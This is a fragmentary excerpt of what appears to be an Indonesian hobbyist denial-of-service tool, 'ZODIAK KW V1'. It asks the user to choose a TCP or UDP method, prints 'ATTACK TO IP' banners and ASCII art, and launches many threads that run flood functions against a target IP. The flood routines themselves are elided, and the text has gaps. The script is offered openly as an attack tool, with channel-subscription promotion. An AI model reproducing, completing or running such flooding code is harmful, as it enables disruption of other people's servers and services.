...
#INI TOOLS BUATAN GRATERNAME/ADAM12
#       AUTHOR: ADAM12/GRATERNAME
# WAJIB SUBSCRIBE CHANNEL GRATERNAME
# KALO ADA KEKURANGAN DI TOOLS INI PM AE # Adam123#1771
...
type("\033[95m ZODIAK KW V1 \033[95m TOOLS BY ADAM12/GRATERNAME")
...
choice = str(input(" \033[94mMAU PAKE METODE (TCP/UDP):"))
...
type("""\033[94mATTACK TO IP \033[35m{ip}""")
type("""\033[91mATTACK TO IP \033[97m{ip}""")
type("""\033[92mATTACK TO IP \033[35m{ip}""")
type("""\033[91mATTACK TO IP \033[35m{ip}""")

time.sleep(2)
os.system("clear")

type("\033[96mJANGAN LUPA SUBS CHANNEL GRATERNAME")

type("""\033[91m                        `     /ymMMMMMMMMMmy/`
                     `/ymMMMMMMMMMMMMMMMmy/`
...
print("""\033[91mT̵̺̻͒͝E̸͔̞͐͐͜͝S̸̘͎͍͛̓̚T̵̠͓͕̈́̾͛I̵͉̞̾͑͝N̴̫͉͚͆́̕G̵̡̼̘̈́̓͝
T̴̼͕͎̽̽͝Ö̵̢͇͎́̾͠O̸͖͖̻͛̾͝L̸͖͓͊̿͝Ś̴̫̪̼͒͒
...
for y in range(threads):
	if choice == 'UDP':
		...
		th = threading.Thread(target = udp7)
		th.start()
	...
	if choice == 'TCP':
		...
		th = threading.Thread(target = tcp6)
		th.start()
		
		th = threading.Thread(target = tcp8)
		th.start()
